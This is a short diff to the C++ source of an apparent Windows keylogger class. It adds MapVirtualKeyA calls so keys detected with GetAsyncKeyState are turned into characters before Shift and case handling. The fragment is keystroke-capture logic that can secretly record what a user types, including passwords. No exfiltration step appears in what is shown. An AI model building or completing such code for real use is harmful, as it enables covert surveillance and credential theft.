@@ -20,13 +20,14 @@ keyStroke keyLogger::checkPressedKey()
         if ((keyStat & 0x1) && GetAsyncKeyState(VK_SHIFT) && i != VK_SHIFT && i != VK_RSHIFT && i != VK_LSHIFT)
         {
             shifted = true;
+            keyChar = MapVirtualKeyA(i, MAPVK_VK_TO_CHAR);
 
             keyChar = keyProcessor::formatShiftedKeys(keyChar);
             i = NUM_OF_KEYS;
         }
         else if (keyStat & 0x1) // Check if a key was pressed without Shift.
         {
-
+            keyChar = MapVirtualKeyA(i, MAPVK_VK_TO_CHAR);
             // Letters are capital by default, convert them to lower case.
             if (keyChar >= 'A' && keyChar <= 'Z')   
                 keyChar = keyProcessor::convertToLowerCase(keyChar);
